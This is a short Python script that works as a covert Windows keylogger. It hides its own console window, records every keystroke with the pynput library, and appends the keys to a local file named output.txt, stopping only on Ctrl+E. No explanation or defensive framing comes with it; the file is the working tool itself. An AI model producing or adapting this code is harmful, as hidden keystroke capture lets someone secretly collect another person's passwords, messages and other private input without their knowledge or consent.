import win32api
import win32console
import win32gui
from pynput.keyboard import Listener

# Hide the console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def log_keystroke(key):
    # Open output.txt to append current keystrokes
    with open(r'output.txt', 'a') as f:
        try:
            # Try to write the actual character key
            f.write(key.char)
        except AttributeError:
            # Handle special keys like space, enter, etc.
            if key == key.space:
                f.write(' ')
            elif key == key.enter:
                f.write('\n')
            else:
                f.write(f'[{key}]')  # Write special keys as [KeyName]

def on_press(key):
    try:
        if key.char == '\x05':  # Ctrl+E to exit
            return False  # Stop listener
    except AttributeError:
        pass
    log_keystroke(key)

# Create a keyboard listener and run it in the background
with Listener(on_press=on_press) as listener:
    listener.join()
